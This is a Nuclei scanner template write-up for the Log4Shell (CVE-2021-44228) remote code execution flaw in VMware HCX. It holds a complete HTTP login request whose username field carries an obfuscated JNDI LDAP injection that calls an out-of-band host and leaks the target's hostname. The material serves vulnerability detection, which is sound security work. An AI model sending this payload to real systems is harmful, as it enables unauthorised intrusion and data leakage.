# Nuclei Template: VMware HCX - Remote Code Execution (Apache Log4j)
**Template ID:** vmware-hcx-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vmware-hcx-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware HCX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
@timeout: 10s
POST /hybridity/api/sessions HTTP/1.1
Host: {{Hostname}}
Accept: application/json
Content-Type: application/json
Origin: {{BaseURL}}

{
  "authType": "password",
  "username": "${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}",
  "password": "admin"
}
```

## References
- https://www.vmware.com/security/advisories/VMSA-2021-0028.html
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
